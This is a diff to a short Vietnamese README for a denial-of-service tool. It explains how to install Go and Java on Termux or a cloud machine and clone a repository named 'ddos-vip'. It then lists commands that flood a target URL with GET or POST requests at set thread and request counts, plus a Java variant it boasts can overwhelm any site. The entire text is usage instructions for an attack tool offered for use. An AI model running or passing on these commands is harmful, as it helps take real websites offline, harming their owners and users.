@@ -1,20 +1,26 @@
 # Setup termux
+pkg update
+
+pkg upgrade
+
 pkg install golang
 
 pkg install openjdk-17
 # Setup gg cloud
+sudo apt update
+
 sudo apt install golang
 # Lệnh Vào Tool
 git clone https://github.com/User-xquyen/ddos-vip
 
 cd toolddos-vippro
 # Chế độ Get sài cho web https://
-go run ddosbyXQ.go https://linkweb.com 2000 get 5000 nil
-# Chế độ Post sài cho web http://
-go run ddosbyXQ.go https://linkweb.com 2000 post 5000 header.txt
-# Java DDoS siêu bá cân all web
+go run ddosbyxq.go https://linkweb.com 2000 get 5000 nil
+# Chế độ Post xài cho web http://
+go run ddosbyxq.go https://linkweb.com 2000 post 5000 header.txt
+# Java DDoS siêu bá cân all web :))
 
-java ddosbyXQ.java
+java ddosbyxq.java
 
 Link web:
 
